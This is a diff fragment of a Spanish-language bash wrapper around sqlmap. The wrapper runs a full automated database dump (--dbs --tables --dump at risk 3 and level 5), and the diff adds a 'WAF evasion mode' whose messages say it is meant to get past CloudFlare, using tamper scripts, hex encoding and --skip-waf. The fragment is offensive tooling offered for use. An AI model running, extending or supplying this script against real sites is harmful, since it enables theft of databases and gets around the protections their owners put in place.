@@ -50,12 +50,12 @@ fi
 echo "[+] Ejecutando extracción de datos completa (Dumping)..."
 
 # Professional sqlmap execution
-FLAGS="--batch --risk=3 --level=5 --threads=5 --dbs --tables --dump --random-agent"
+FLAGS="--batch --risk=3 --level=5 --threads=2 --dbs --tables --dump --random-agent --delay=1 --timeout=15 --retries=2"
 
 if [[ "$WAF_EVADE" == "s" ]]; then
-    echo "[!] MODO EVASIÓN ACTIVADO: Usando scripts tamper para saltar CloudFlare..."
+    echo "[!] MODO EVASIÓN ACTIVADO: Usando scripts tamper y delay para saltar CloudFlare..."
     # Scripts específicos para ofuscar payloads y saltar filtros WAF
-    FLAGS="$FLAGS --tamper=between,charencode,charunicodeencode,equaltolike,randomcase --hex"
+    FLAGS="$FLAGS --tamper=between,charencode,charunicodeencode,equaltolike,randomcase --hex --check-waf --skip-waf"
 fi
 
 if [ ! -z "$POST_DATA" ]; then
